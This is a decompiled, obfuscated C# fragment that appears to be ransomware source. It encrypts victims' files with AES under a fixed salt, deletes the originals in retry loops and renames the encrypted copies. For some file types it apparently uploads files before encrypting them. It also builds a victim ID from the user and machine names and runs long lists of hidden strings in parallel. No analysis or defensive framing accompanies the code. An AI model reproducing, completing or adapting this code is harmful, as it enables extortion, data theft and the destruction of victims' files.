										yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
									}
									else
									{
										yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
									}
								}
								catch (Exception ex2)
								{
									if (hIFJbdEMJudY)
									{
										try
										{
											File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386695) + ex2.Message + HbGtZiKmUw.getString_0(107395828));
										}
										catch (Exception)
										{
										}
									}
									gmdqiJfLiKSG++;
									return;
								}
							}
							if (MFCrMNyVwftIF)
							{
								if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
								{
									oQVgdpANcfhNxO(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, bytes);
								}
								else
								{
									oQVgdpANcfhNxO(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, bytes);
								}
							}
						}
						end_IL_089e:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1055;
			IL_1055:
			CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa.Remove(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
		});
	}

	private static void LHPrCtCcCAgjDkmw(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CMdYdSoRLCrMajhb == getString_0(107396859))
					{
						foreach (string item in hHDzREQRrQkqjKe)
						{
							if (string_0.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396859))
							{
								if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396682))
							{
								try
								{
									ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386654)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386654), getString_0(107389086)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void yWogjCIsHMw(string lJIdkJVMHQru, string aEYDawZIluprC, byte[] QBrTrpiuwPQQk, byte[] eHHJYFFpxLD = null)
	{
		try
		{
			if (CMdYdSoRLCrMajhb == getString_0(107396859))
			{
				FileStream fileStream = new FileStream(lJIdkJVMHQru, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in hHDzREQRrQkqjKe)
				{
					if (lJIdkJVMHQru.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396859))
					{
						if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), lJIdkJVMHQru);
							}
							catch
							{
							}
						}
					}
					else if (lJIdkJVMHQru.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396682))
					{
						try
						{
							ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), lJIdkJVMHQru);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (lJIdkJVMHQru != aEYDawZIluprC)
		{
			File.Move(lJIdkJVMHQru, aEYDawZIluprC);
			lJIdkJVMHQru = aEYDawZIluprC;
		}
		byte[] bytes = GGGzGnJbALqDB.ofyMhRiGkVjut(File.ReadAllBytes(lJIdkJVMHQru), QBrTrpiuwPQQk, eHHJYFFpxLD);
		File.WriteAllBytes(lJIdkJVMHQru, bytes);
		DnHtYVwZFeaR++;
	}

	private static void edWBraEVjZnwU(string string_0, string string_1, byte[] byte_0)
	{
		ewNiqrWpEUQhvJr CS_0024_003C_003E8__locals0 = new ewNiqrWpEUQhvJr();
		CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc = string_0;
		CS_0024_003C_003E8__locals0.VBXkXxUgmNJw = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string vBXkXxUgmNJw = CS_0024_003C_003E8__locals0.VBXkXxUgmNJw;
			FileStream fileStream = new FileStream(vBXkXxUgmNJw, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (kcgyNtrPsiyuwV == getString_0(107396859))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.VBXkXxUgmNJw.Length > 0)
				{
					if (CMdYdSoRLCrMajhb == getString_0(107396859))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in hHDzREQRrQkqjKe)
						{
							if (CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396859))
							{
								if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396682))
							{
								try
								{
									ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.VBXkXxUgmNJw.EndsWith(getString_0(107386654)))
					{
						File.Move(CS_0024_003C_003E8__locals0.VBXkXxUgmNJw, CS_0024_003C_003E8__locals0.VBXkXxUgmNJw.Replace(getString_0(107386654), getString_0(107389086)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.VBXkXxUgmNJw))
							{
								File.Delete(CS_0024_003C_003E8__locals0.VBXkXxUgmNJw);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387426) + CS_0024_003C_003E8__locals0.dFiPRFTAZdSvgLc + getString_0(107386677) + ex2.Message + getString_0(107395810));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> chiDTlAoGQMI = ChiDTlAoGQMI;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386567)), string_0);
			};
		}
		Parallel.ForEach(chiDTlAoGQMI, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source = qCvAdJfngnF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386586)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (pdVkOWqmIAKIO == getString_0(107396859))
		{
			string[] source2 = yWgWMeznrQnK;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386586)), getString_0(107386529) + string_0 + getString_0(107386552));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!KDRBaizPAVVdHDL().Contains(getString_0(107388600)))
		{
			try
			{
				DxkPRjlZwqzF(ApqYNCacJvgq);
			}
			catch (Exception)
			{
			}
			List<string> source3 = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		else
		{
			List<string> source4 = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
				{
					spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
		}
		List<string> source5 = hYLuEtEuxHyq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
			{
				spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386547)), string_0);
			};
		}
		Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386567)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386586)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386586)), getString_0(107386529) + string_0 + getString_0(107386552));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386547)), string_0);
	}

	static hWHDXjXKuyuXQ()
	{
		Strings.CreateGetStringDelegate(typeof(hWHDXjXKuyuXQ));
		AgnlixIASzPo = getString_0(107388595);
		cjnjoiIOwY = null;
		oLUeHhoXSrXL = getString_0(107396682);
		rqLFEsCDTMyF = getString_0(107386498);
		qyAhWYLrtiOtS = new List<string>();
		ZptgORKOFpXG = new List<string>();
		UyxzMyCitXGF = getString_0(107396682);
		kEFVKbULbQeU = getString_0(107389086);
		HZePHYGbpexu = getString_0(107389086);
		jdzEbvPutazU = getString_0(107389086);
		ZRDcpXUTjf = getString_0(107396682);
		mChCVJySpU = 0;
		mdbUrlsnzSwt = getString_0(107396682);
		WLuIVsIaUhiu = getString_0(107396682);
		HCpNwQtDwzNYscU = getString_0(107396682);
		GGlQFQXWCSTMex = getString_0(107386517);
		JEhiYMEqiJZdM = getString_0(107396682);
		IgkMrPNdoY = getString_0(107396682);
		NCTXVCAZAjOmyja = getString_0(107396682);
		xZEDYYkzZNtnw = getString_0(107396682);
		LhumsKBCnHATf = new List<string>
		{
			XtEtTgUvwHGMW(getString_0(107386512)),
			XtEtTgUvwHGMW(getString_0(107386975)),
			XtEtTgUvwHGMW(getString_0(107386950)),
			XtEtTgUvwHGMW(getString_0(107386965)),
			XtEtTgUvwHGMW(getString_0(107386908)),
			XtEtTgUvwHGMW(getString_0(107386883)),
			XtEtTgUvwHGMW(getString_0(107386898)),
			XtEtTgUvwHGMW(getString_0(107386873)),
			XtEtTgUvwHGMW(getString_0(107386816)),
			XtEtTgUvwHGMW(getString_0(107386791)),
			XtEtTgUvwHGMW(getString_0(107386806)),
			XtEtTgUvwHGMW(getString_0(107386749)),
			XtEtTgUvwHGMW(getString_0(107386212))
		};
		rEUVMKgscr = new List<string>();
		oMdDoqdvvo = getString_0(107396682);
		VIQnoauQMXDbY = getString_0(107396682);
		GMXxpLBEnImyJ = getString_0(107396682);
		lBBLtRfPsPV = new List<string>();
		MNBzqiuQfRJQcYj = getString_0(107396682);
		XgJEKIOOydLD = getString_0(107386219);
		mWfsjXfVaDjgsa = getString_0(107396682);
		ncZxFsAKDqAUKI = getString_0(107396682);
		ChiDTlAoGQMI = new List<string>
		{
			XtEtTgUvwHGMW(getString_0(107386170)),
			XtEtTgUvwHGMW(getString_0(107386089)),
			XtEtTgUvwHGMW(getString_0(107386072)),
			XtEtTgUvwHGMW(getString_0(107385991)),
			XtEtTgUvwHGMW(getString_0(107386486)),
			XtEtTgUvwHGMW(getString_0(107386421)),
			XtEtTgUvwHGMW(getString_0(107386312)),
			XtEtTgUvwHGMW(getString_0(107386283))
		};
		qCvAdJfngnF = new List<string>
		{
			XtEtTgUvwHGMW(getString_0(107385714)),
			XtEtTgUvwHGMW(getString_0(107385681)),
			XtEtTgUvwHGMW(getString_0(107385604)),
			XtEtTgUvwHGMW(getString_0(107385587)),
			XtEtTgUvwHGMW(getString_0(107385554)),
			XtEtTgUvwHGMW(getString_0(107385473)),
			XtEtTgUvwHGMW(getString_0(107385972)),
			XtEtTgUvwHGMW(getString_0(107385939)),
			XtEtTgUvwHGMW(getString_0(107385906)),
			XtEtTgUvwHGMW(getString_0(107385873)),
			XtEtTgUvwHGMW(getString_0(107385840)),
			XtEtTgUvwHGMW(getString_0(107385807)),
			XtEtTgUvwHGMW(getString_0(107385734)),
			XtEtTgUvwHGMW(getString_0(107385181)),
			XtEtTgUvwHGMW(getString_0(107385168)),
			XtEtTgUvwHGMW(getString_0(107385135)),
			XtEtTgUvwHGMW(getString_0(107385062)),
			XtEtTgUvwHGMW(getString_0(107385029)),
			XtEtTgUvwHGMW(getString_0(107384988)),
			XtEtTgUvwHGMW(getString_0(107384979)),
			XtEtTgUvwHGMW(getString_0(107385458)),
			XtEtTgUvwHGMW(getString_0(107385385)),
			XtEtTgUvwHGMW(getString_0(107385352)),
			XtEtTgUvwHGMW(getString_0(107385714)),
			XtEtTgUvwHGMW(getString_0(107385311)),
			XtEtTgUvwHGMW(getString_0(107385302)),
			XtEtTgUvwHGMW(getString_0(107385225)),
			XtEtTgUvwHGMW(getString_0(107384680)),
			XtEtTgUvwHGMW(getString_0(107384639)),
			XtEtTgUvwHGMW(getString_0(107384630)),
			XtEtTgUvwHGMW(getString_0(107384597)),
			XtEtTgUvwHGMW(getString_0(107384556)),
			XtEtTgUvwHGMW(getString_0(107384483)),
			XtEtTgUvwHGMW(getString_0(107385681)),
			XtEtTgUvwHGMW(getString_0(107384474)),
			XtEtTgUvwHGMW(getString_0(107385604)),
			XtEtTgUvwHGMW(getString_0(107384953)),
			XtEtTgUvwHGMW(getString_0(107384920)),
			XtEtTgUvwHGMW(getString_0(107384879)),
			XtEtTgUvwHGMW(getString_0(107384846)),
			XtEtTgUvwHGMW(getString_0(107384773)),
			XtEtTgUvwHGMW(getString_0(107384732)),
			XtEtTgUvwHGMW(getString_0(107384699)),
			XtEtTgUvwHGMW(getString_0(107384186)),
			XtEtTgUvwHGMW(getString_0(107384145)),
			XtEtTgUvwHGMW(getString_0(107384072)),
			XtEtTgUvwHGMW(getString_0(107384031))
		};
		bruHyzeehnYYe = new List<string>
		{
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107384022))),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107383941))),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107384360))),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107384263))),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107383658))),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107383561))),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107383500))),
			XtEtTgUvwHGMW(getString_0(107383915)),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107383822))),
			XtEtTgUvwHGMW(getString_0(107383725)),
			XtEtTgUvwHGMW(getString_0(107383120)),
			XtEtTgUvwHGMW(getString_0(107383023)),
			XtEtTgUvwHGMW(getString_0(107382930)),
			XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107384022)))
		};
		ApqYNCacJvgq = XtEtTgUvwHGMW(getString_0(107383345));
		hYLuEtEuxHyq = new List<string>
		{
			XtEtTgUvwHGMW(getString_0(107383200)),
			XtEtTgUvwHGMW(getString_0(107382494)),
			XtEtTgUvwHGMW(getString_0(107382812)),
			XtEtTgUvwHGMW(getString_0(107382138)),
			XtEtTgUvwHGMW(getString_0(107381944)),
			XtEtTgUvwHGMW(getString_0(107382262))
		};
		GYrkTbkHmlHWMo = new List<string>
		{
			XtEtTgUvwHGMW(getString_0(107381556)),
			XtEtTgUvwHGMW(getString_0(107381495)),
			XtEtTgUvwHGMW(getString_0(107381434))
		};
		ZEmVnICIbBRUZQ = getString_0(107396682);
		UgaPTwgoRjIJ = getString_0(107396682);
		dcWTdhUfGduYB = new DateTime(2000, 1, 1);
		pIlCbMiwoka = new DateTime(2100, 1, 1);
		ZTtOBFIFhDPJ = getString_0(107396859);
		ybUSgcGwjKebC = getString_0(107387268);
		bfLHAxJfKaXqSS = getString_0(107396682);
		HOpZOfKRSkqrQ = getString_0(107396682);
		dzHgpDGlGW = getString_0(107396682);
		bMxANrWiPUcalcb = getString_0(107396859);
		NkvCSDGHDZ = getString_0(107396682);
		CMdYdSoRLCrMajhb = getString_0(107396682);
		hHDzREQRrQkqjKe = new List<string>
		{
			getString_0(107395976),
			getString_0(107395690),
			getString_0(107396010),
			getString_0(107395603)
		};
		TQwKQbvIHjGUX = getString_0(107396682);
		wlgCZFnHvCei = getString_0(107381853);
		SGWNbaKnmA = getString_0(107396682);
		LMpNgFGShlT = getString_0(107396682);
		TTbEbSgDAnnJ = getString_0(107396682);
		FalYYrscvz = string.Empty;
		vEIuBeySmAexSb = getString_0(107396682);
		wvVqxnBdrKxaCFZ = getString_0(107396859);
		kvwQzPxIqIlk = getString_0(107396859);
		VyRGExDcVMKv = getString_0(107381880);
		DsHDKKZPqyRV = getString_0(107381807);
		cldkFsbciuo = getString_0(107396682);
		jJkNZEReBTMkuY = getString_0(107396682);
		HVmQpJlElf = getString_0(107396682);
		oTOnJctkwlomjyOZ = getString_0(107396682);
		eRcopzfggFE = getString_0(107396682);
		TUGYFpvgdQx = getString_0(107388704);
		eKzyHsWGljk = getString_0(107396682);
		KMWeqbAyUYuGHH = getString_0(107396682);
		rwyuADDQdblNA = getString_0(107413357);
		OCCDMTBKtUqAz = getString_0(107396682);
		rWgzoQLgIQfGZ = getString_0(107396682);
		YWANRiRWiwxS = getString_0(107396682);
		ZOYchrvgjtkVKhh = getString_0(107396682);
		PvAuHyHwFZ = getString_0(107413308);
		IRCSlCXoMRFG = getString_0(107396859);
		iHEcKVZxNihtAo = getString_0(107396859);
		fFgPwmFliHHKe = getString_0(107396682);
		pdVkOWqmIAKIO = getString_0(107396682);
		yWgWMeznrQnK = new string[0];
		kcgyNtrPsiyuwV = getString_0(107396859);
		OIyyeuNoRzhHTwe = true;
		DMbGhzJPCMTj = getString_0(107396859);
		MFCrMNyVwftIF = true;
		ryIZnDiEOid = false;
		EekjbAOphgGS = false;
		EMUmjShvoRjVxRTfB = false;
		LImNkSPhwOOQHW = getString_0(107413327);
		hIFJbdEMJudY = false;
		uJePXmmfyrV = false;
		QNcazMBOlHTTBH = false;
		WRwAKzNShnoL = false;
		wRVzxmISkhBzKR = true;
		mqQgvSYgrlnpSvAge = getString_0(107413306) + Environment.UserName + getString_0(107413293) + Environment.MachineName + getString_0(107413272) + ySVDzMAbizHUS.yinVnqLUaFwpJQJ() + getString_0(107413267);
		qqVKUcwYqRObMU = true;
		UNPGQjVMpE = new Stopwatch();
		gmdqiJfLiKSG = 0;
		DnHtYVwZFeaR = 0;
		eSjMTjCatON = false;
		BBDxmQurRdVswG = getString_0(107413226) + ySVDzMAbizHUS.yinVnqLUaFwpJQJ() + getString_0(107413217);
		CCiaOWbaRz = new string[1] { getString_0(107413212) };
		yDNKtVeuKTBPdF = new List<string>();
		bcPffxszCs = 0;
		DHzgvUPuaGcJ = true;
		ShkWUIXYoOWB = false;
		AbzhPXXcXCCr = false;
		fiNlreSRwIMD = false;
		IeiMhxonCbw = false;
		kXcVqGPhsGu = false;
		LprhUPIkKugxdZ = new List<string>();
		fOCEhEMJTPme = getString_0(107413603);
		CuCRTFRskQOdHM = true;
	}
}
